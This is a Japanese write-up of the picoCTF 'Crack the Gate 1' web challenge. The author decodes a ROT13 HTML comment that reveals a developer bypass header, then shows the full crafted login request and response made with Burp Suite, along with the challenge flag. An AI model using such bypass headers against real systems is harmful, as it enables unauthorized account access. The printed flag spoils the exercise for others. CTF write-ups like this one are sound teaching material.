---
title: picoMini by CMU-Africa「Crack the Gate」Medium Writeup
description: picoMini「Crack the Gate 1」のwriteup．HTMLコメントを ROT13 で復号して開発用ヘッダー X-Dev-Access を見つけ，Burp Suite で付与してログインをバイパスする
date: 2025-11-22 12:00:00 +0900
categories: [CyberSecurity, CTF]
tags: [picoctf, web]
---

- Challenge: Crack the Gate 1
- Tags: browser_webshell_solvable
- Genre: Web
- Difficulty: EASY
- Overview: We’re in the middle of an investigation. One of our persons of interest, ctf player, is believed to be hiding sensitive data inside a restricted web portal. We’ve uncovered the email address he uses to log in: ctf-player@picoctf.org. Unfortunately, we don’t know the password, and the usual guessing techniques haven’t worked. But something feels off... it’s almost like the developer left a secret way in. Can you figure it out?

![crack_01](/assets/img/ctf/pico_ctf/pico_mini_cmu_africa_medium_crack_the_gate_1_01.png)

サイトにアクセスし，開発者ツールでソースコードを見てみると，謎のコメントが記載されています．
経験則に基づき，暗号化アルゴリズムが`Rot13`ではないかと考えました．<br>よって，`Cyber Chef`を用いて，復号してみると`Jack - temporary bypass: use header "X-Dev-Access: yes"`という情報が入手できました．<br>
下の文言にも，本番環境では削除しろと記載されているため，開発環境ログインのためのヘッダであると推測しました．

```html
<!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
<!-- Remove before pushing to production! -->
```

細工したheaderを挿入するため，ログインフォームを`burpsuite`でインターセプトし，`Repeater`に送信します．<br>
与えられているemailと適当なパスワードを用いて，`X-Dev-Access: yes`を付けて送信すると，flagが入手できました．

```
// Request
POST /login HTTP/1.1
Host: amiable-citadel.picoctf.net:60689
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Dev-Access: yes <--- add header
Referer: http://amiable-citadel.picoctf.net:60689/
Content-Type: application/json
Content-Length: 53
Origin: http://amiable-citadel.picoctf.net:60689
DNT: 1
Connection: keep-alive
Priority: u=0

{"email":"ctf-player@picoctf.org","password":"admin"}


// Response
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 127
ETag: W/"7f-08c0XQDBsrF6m1lSovMrUmsZSUo"
Date: Sat, 22 Nov 2025 14:13:37 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"success":true,"email":"ctf-player@picoctf.org","firstName":"pico","lastName":"player","flag":"picoCTF{brut4_f0rc4_3c6b118b}"}
```

<details>
<summary>Flag</summary>
picoCTF{brut4_f0rc4_3c6b118b}
</details>